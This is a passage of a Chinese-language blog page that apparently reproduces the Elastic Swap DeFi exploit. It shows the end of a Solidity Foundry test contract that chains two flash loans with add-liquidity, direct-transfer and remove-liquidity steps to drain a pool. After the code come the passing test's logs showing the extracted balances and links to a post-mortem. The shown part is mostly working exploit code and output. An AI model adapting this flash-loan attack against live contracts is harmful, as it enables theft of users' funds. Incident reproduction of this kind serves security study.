function_">address</span>(elp),<span class="title function_">type</span>(uint).<span class="property">max</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title class_">SPair</span>.<span class="title function_">swap</span>(<span class="number">51_112</span> * <span class="number">1e18</span>,<span class="number">0</span>,<span class="title function_">address</span>(<span class="variable language_">this</span>),<span class="keyword">new</span> <span class="title function_">bytes</span>(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">uniswapV2Call</span>(<span class="params">address sender,uint256 amount0,uint256 amount1, bytes calldata data</span>) external&#123;</span><br><span class="line">        <span class="title class_">JPair</span>.<span class="title function_">swap</span>(<span class="number">766_685</span> * <span class="number">1e6</span>,<span class="number">0</span>,<span class="title function_">address</span>(<span class="variable language_">this</span>),<span class="keyword">new</span> <span class="title function_">bytes</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="comment">//归还闪电贷</span></span><br><span class="line">        <span class="variable constant_">TIC</span>.<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="title class_">SPair</span>),<span class="number">51_112</span> * <span class="number">1.01</span> * <span class="number">1e18</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;attack complete, usdc.e balance:&#x27;</span>,<span class="variable constant_">USDC_E</span>.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>))/<span class="number">1e6</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;attack complete, tic balance:&#x27;</span>,<span class="variable constant_">TIC</span>.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>))/<span class="number">1e18</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">joeCall</span>(<span class="params">address sender,uint256 amount0,uint256 amount1,bytes calldata data</span>) external &#123;</span><br><span class="line">        <span class="comment">//添加流动性</span></span><br><span class="line">        <span class="comment">// elp.addLiquidity(1e9,0, 0, 0, address(this), block.timestamp);</span></span><br><span class="line">        uint _baseTokenQtyDesired = <span class="variable constant_">TIC</span>.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(elp));</span><br><span class="line">        uint _quoteTokenQtyDesired = <span class="variable constant_">USDC_E</span>.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(elp));</span><br><span class="line">        elp.<span class="title function_">addLiquidity</span>(_baseTokenQtyDesired, _quoteTokenQtyDesired, <span class="number">1</span>, <span class="number">1</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), block.<span class="property">timestamp</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addliquty complete tic:&quot;</span>,_baseTokenQtyDesired/<span class="number">1e18</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addliquty complete usdc.e:&quot;</span>,_quoteTokenQtyDesired/<span class="number">1e6</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//转账</span></span><br><span class="line">        <span class="variable constant_">USDC_E</span>.<span class="title function_">transfer</span>(<span class="title function_">address</span>(elp),<span class="variable constant_">USDC_E</span>.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(elp))-<span class="number">1000_000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//移除流动性</span></span><br><span class="line">        uint256 _liquidityTokenQty  = elp.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addliquty complete lp:&quot;</span>,_liquidityTokenQty);</span><br><span class="line">        </span><br><span class="line">        elp.<span class="title function_">removeLiquidity</span>(_liquidityTokenQty, <span class="number">1</span>, <span class="number">1</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), block.<span class="property">timestamp</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//购买tic</span></span><br><span class="line">        elp.<span class="title function_">swapQuoteTokenForBaseToken</span>(<span class="number">50</span>*<span class="number">1e6</span>,<span class="number">1</span>,block.<span class="property">timestamp</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;buy tic successful&#x27;</span>,<span class="variable constant_">TIC</span>.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>))/<span class="number">1e18</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//再次添加流动性</span></span><br><span class="line">        uint256 base_amount = <span class="variable constant_">TIC</span>.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        uint256 quote_amount = <span class="variable constant_">USDC_E</span>.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        elp.<span class="title function_">addLiquidity</span>(base_amount,quote_amount,<span class="number">1</span>,<span class="number">1</span>,<span class="title function_">address</span>(<span class="variable language_">this</span>),block.<span class="property">timestamp</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//再次移除流动性</span></span><br><span class="line">        elp.<span class="title function_">removeLiquidity</span>(elp.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)),<span class="number">1</span>,<span class="number">1</span>,<span class="title function_">address</span>(<span class="variable language_">this</span>),block.<span class="property">timestamp</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;usdc.e balance:&#x27;</span>,<span class="variable constant_">USDC_E</span>.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">        <span class="comment">//归还闪电贷</span></span><br><span class="line">        <span class="variable constant_">USDC_E</span>.<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="title class_">JPair</span>),<span class="number">766_685</span> * <span class="number">1.011</span> * <span class="number">1e6</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Running 1 test for src/test/elasticswapexp.sol:elasticswapExploit</span><br><span class="line">[PASS] testExploit() (gas: 526389)</span><br><span class="line">Logs:</span><br><span class="line">  addliquty complete tic: 41532</span><br><span class="line">  addliquty complete usdc.e: 196885</span><br><span class="line">  addliquty complete lp: 4412803431946595</span><br><span class="line">  buy tic successful 92231</span><br><span class="line">  usdc.e balance: 961763144176</span><br><span class="line">  attack complete, usdc.e balance: 186644</span><br><span class="line">  attack complete, tic balance: 40608</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://snowtrace.deth.net/address/0x4ae1da57f2d6b2e9a23d07e264aa2b3bbcaed19a#code">https://snowtrace.deth.net/address/0x4ae1da57f2d6b2e9a23d07e264aa2b3bbcaed19a#code</a></p>
+<p><a target="_blank" rel="noopener" href="https://quillaudits.medium.com/decoding-elastic-swaps-850k-exploit-quillaudits-9ceb7fcd8d1a">https://quillaudits.medium.com/decoding-elastic-swaps-850k-exploit-quillaudits-9ceb7fcd8d1a</a></p>
+
+
+                
+            </div>
+
+            <!-- Comments -->
+            
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    
+
+
+                </div>
+            
+        </div>
+    </div>
+</article>
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    
+
+                    
+
+                    
+                        <li>
+                            <a href="https://github.com/HiT0on" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+
+                    
+                </ul>
+                <p class="copyright text-muted">&copy; 2023 d1rrick<br></p>
+                <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
+                <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
